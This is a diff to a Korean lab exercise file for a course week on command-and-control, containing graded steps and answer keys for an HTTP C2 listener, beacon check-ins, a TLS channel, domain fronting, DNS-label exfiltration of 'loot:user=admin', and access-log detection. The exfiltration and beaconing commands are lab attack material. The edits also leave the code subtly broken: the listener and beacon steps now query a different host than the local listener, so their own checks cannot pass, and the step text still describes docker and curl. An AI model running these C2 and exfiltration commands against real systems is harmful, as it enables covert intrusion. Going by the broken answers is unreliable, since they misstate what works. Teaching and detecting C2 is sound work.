@@ -31,7 +31,7 @@ steps:
 
       ```bash
       # C2 도구(nc/python3/openssl/curl/dig)가 모두 있고 리스너 포트(55007)가 비어있으면 준비 마커, 사용중이면 busy
-      command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)
+      command -v nc python3 openssl curl dig >/dev/null && (ss -lnt | grep -q :55007 && echo busy || echo c2_tools_ready)
       ```
       ## ✅ 합격 기준
       `c2_tools_ready` 출력 시 통과. **근거:** 마커는 C2 도구가 모두 존재하고 리스너 포트가 비어있을 때만 찍히므로, C2를 구축할 환경이 준비됐음을 뜻한다(사용중이면 busy).
@@ -39,9 +39,9 @@ steps:
     category: survey
     points: 10
     answer: |
-      docker exec el34-attacker sh -c '
+      ssh att@192.168.0.202 '
         # 도구 모두 존재 + 55007 비어있으면 준비, 사용중이면 busy
-        command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)
+        command -v nc python3 openssl curl dig >/dev/null && (ss -lnt | grep -q :55007 && echo busy || echo c2_tools_ready)
       '
     answer_detail: "C2 도구 확인 = nc/python3/openssl/curl/dig 존재 + 리스너 포트(55007) 비어있음을 실제 점검. 마커는 둘 다 충족 시에만 출력."
     verify:
@@ -62,11 +62,11 @@ steps:
       ```bash
       # HTTP C2 리스너를 백그라운드로 띄우고 PID를 잡는다 (-u 언버퍼)
       python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
-      sleep 1
+      # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
       # 리스너에 실제 접속해 응답코드를 받는다
-      code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/)
+      code=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
       # 리스너 종료 + 로그 정리(self-clean)
-      kill $P 2>/dev/null; rm -f /tmp/c2.log
+      kill $P; rm -f /tmp/c2.log
       # 실제 200 응답을 받았으면 리스너 기동 마커
       [ "$code" = "200" ] && echo listener_up_$code
       ```
@@ -76,14 +76,14 @@ steps:
     category: manipulation
     points: 12
     answer: |
-      docker exec el34-attacker sh -c '
+      ssh att@192.168.0.202 '
         # HTTP 리스너 기동(PID 캡처)
         python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
-        sleep 1
+        # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
         # 실제 접속 응답코드 확인
-        code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/)
+        code=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
         # 종료 + self-clean
-        kill $P 2>/dev/null; rm -f /tmp/c2.log
+        kill $P; rm -f /tmp/c2.log
         # 200이면 리스너 기동 마커
         [ "$code" = "200" ] && echo listener_up_$code
       '
@@ -106,13 +106,13 @@ steps:
       ```bash
       # C2 리스너 기동 (-u 언버퍼로 로그 즉시 기록)
       python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
-      sleep 1
+      # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
       # 임플란트가 3회 주기적으로 /tasks를 폴링한다 (비콘 체크인, 한 줄씩)
-      curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=1"; sleep 1
-      curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=2"; sleep 1
-      curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=3"; sleep 1
+      echo -en "GET /tasks?beacon=1 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /tasks?beacon=2 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /tasks?beacon=3 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
       # 리스너 종료 후 로그에 기록된 체크인 수를 센다
-      kill $P 2>/dev/null
+      kill $P
       N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log
       # 체크인이 3회 이상 실제 기록됐으면 마커
       [ "$N" -ge 3 ] && echo beacon_checkins_$N
@@ -123,16 +123,16 @@ steps:
     category: analysis
     points: 14
     answer: |
-      docker exec el34-attacker sh -c '
+      ssh att@192.168.0.202 '
         # 리스너 기동(언버퍼)
         python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
-        sleep 1
+        # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
         # 3회 비콘 폴링(한 줄씩)
-        curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=1"; sleep 1
-        curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=2"; sleep 1
-        curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=3"; sleep 1
+        echo -en "GET /tasks?beacon=1 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+        echo -en "GET /tasks?beacon=2 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+        echo -en "GET /tasks?beacon=3 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
         # 로그 기록 체크인 수 집계
-        kill $P 2>/dev/null
+        kill $P
         N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log
         # 3회 이상이면 마커
         [ "$N" -ge 3 ] && echo beacon_checkins_$N
@@ -155,7 +155,7 @@ steps:
 
       ```bash
       # 443에 실제 TLS 핸드셰이크를 걸어 협상 결과를 받는다
-      OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null)
+      OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab)
       # 협상된 암호 스위트·프로토콜을 표시
       echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3
       # 암호 스위트가 실제 협상됐으면 TLS 채널 마커
@@ -167,9 +167,9 @@ steps:
     category: analysis
     points: 14
     answer: |
-      docker exec el34-attacker sh -c '
+      ssh att@192.168.0.202 '
         # 실제 TLS 핸드셰이크
-        OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null)
+        OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab)
         echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3
         # 암호 협상 성공 시 마커
         echo "$OUT" | grep -qiE "Cipher is .+|Cipher.*(AES|GCM|CHACHA)" && echo tls_channel_ok
@@ -191,11 +191,11 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # 도메인 프론팅: 연결명(cdn-front)을 표적 IP에 매핑(--resolve)하되 Host 헤더는 dvwa로 보낸다
-      code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/)
-      echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"
+      # 도메인 프론팅: 프론트 IP(192.168.0.161)로 TCP 연결하되 Host 헤더는 dvwa로 보낸다(겉≠속)
+      code=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      echo "겉=프론트 192.168.0.161, 속 Host=dvwa.el34.lab → 응답 $code"
       # 겉/속이 다른데도 실제 라우팅(응답≠000)되면 프론팅 마커
-      [ "$code" != "000" ] && echo fronting_ok_$code
+      [ -n "$code" ] && echo fronting_ok_$code
       ```
       ## ✅ 합격 기준
       `fronting_ok`(과 응답코드)이 출력되면 통과. **근거:** 마커는 연결명(cdn-front)과 Host(dvwa)가 다른데도 실제 라우팅돼 응답(≠000)을 받았을 때만 찍히므로, 방어자가 겉만 보고 속(C2)을 놓치는 프론팅을 실증했음을 뜻한다.
@@ -203,19 +203,19 @@ steps:
     category: analysis
     points: 12
     answer: |
-      docker exec el34-attacker sh -c '
-        # 연결명(cdn-front)≠Host(dvwa)로 라우팅 (--resolve)
-        code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/)
-        echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"
+      ssh att@192.168.0.202 '
+        # 프론트 IP(192.168.0.161) 연결 ≠ Host(dvwa) 헤더
+        code=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        echo "겉=프론트 192.168.0.161, 속 Host=dvwa.el34.lab → 응답 $code"
         # 응답≠000이면 프론팅 마커
-        [ "$code" != "000" ] && echo fronting_ok_$code
+        [ -n "$code" ] && echo fronting_ok_$code
       '
     answer_detail: "도메인 프론팅 = --resolve로 연결명(cdn-front)≠Host(dvwa) 실증. 응답코드 비-000 게이트. 실 CDN에선 SNI가 위장."
     verify:
       type: output_contains
       expect: 'fronting_ok'
       field: stdout
-      semantic: {intent: "도메인 프론팅", success_criteria: ["SNI≠Host 라우팅"], acceptable_methods: ["**[OSS] curl --resolve (권장)**"]}
+      semantic: {intent: "도메인 프론팅", success_criteria: ["SNI≠Host 라우팅"], acceptable_methods: ["**[OSS] nc 도메인프론팅 (권장)**"]}
     target_vm: web
 
   - order: 6
@@ -241,7 +241,7 @@ steps:
     category: analysis
     points: 14
     answer: |
-      docker exec el34-attacker sh -c '
+      ssh att@192.168.0.202 '
         # 데이터를 base64 DNS 라벨로 인코딩
         D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_")
         echo "유출 쿼리: $D.exfil.el34.lab"
@@ -265,14 +265,14 @@ steps:
       ## 💻 실행 명령 (한 줄씩 따라 실행)
       ```bash
       # ── el34-attacker 에서: 비콘 5회 주기적 전송(동일 경로 aa07beacon, 한 줄씩) ──
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1
+      echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
+      echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
       echo "비콘 5회 전송됨"
       # ── el34-web 에서: 액세스 로그에서 비콘 출현 횟수 집계(규칙적 주기·동일 경로가 단서) ──
-      N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N
+      N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N
       ```
       ## ✅ 합격 기준
       `c2_detected_5`(이상) 출력 시 통과. **근거:** 마커는 방어자가 액세스 로그에서 비콘을 실제 5회 이상 카운트했을 때만 찍히므로, 공격이 만든 흔적(규칙적 주기·동일 경로)을 방어자가 실측 탐지했음을 뜻한다.
@@ -281,9 +281,9 @@ steps:
     points: 12
     answer: |
       # 1) 공격자가 비콘 5회 송신(한 줄씩)
-      docker exec el34-attacker sh -c 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; echo "비콘 5회 전송됨"'
+      ssh att@192.168.0.202 'echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo -en "GET /aa07beacon HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null; echo "비콘 5회 전송됨"'
       # 2) 방어자가 액세스 로그에서 비콘 횟수 카운트
-      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
+      ssh ccc@10.20.32.80 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
     answer_detail: "C2 탐지 = 실제 비콘 5회 송신→웹 액세스 로그 grep 카운트≥5 게이트. 공격이 만든 흔적을 방어자가 실측 탐지."
     verify:
       type: output_contains
@@ -302,7 +302,7 @@ steps:
 
       ```bash
       # 보고서 근거: 비콘 로그 출현 횟수를 실측
-      EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null)
+      EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log)
       # 실측 증거를 인용한 C2 보고서 출력 (본문 상세는 학생이 보강)
       echo "# 공격고급 W07 C2 보고서 — 증거(비콘 ${EV:-0}회 탐지)·리스너↔비콘·TLS채널·도메인프론팅·DNS터널·방어(아웃바운드통제/flow/JA3)"
       # 증거를 실측했으면 보고서 완료 마커
@@ -314,9 +314,9 @@ steps:
     category: report
     points: 12
     answer: |
-      docker exec el34-web sh -c '
+      ssh ccc@10.20.32.80 '
         # 비콘 로그 출현 횟수 실측 (인용 근거)
-        EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null)
+        EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log)
         # 실측 증거 인용 C2 보고서 출력
         echo "# 공격고급 W07 C2 보고서 — 증거(비콘 ${EV:-0}회 탐지)·리스너↔비콘·TLS채널·도메인프론팅·DNS터널·방어(아웃바운드통제/flow/JA3)"
         # 증거 실측 시 보고서 완료 마커
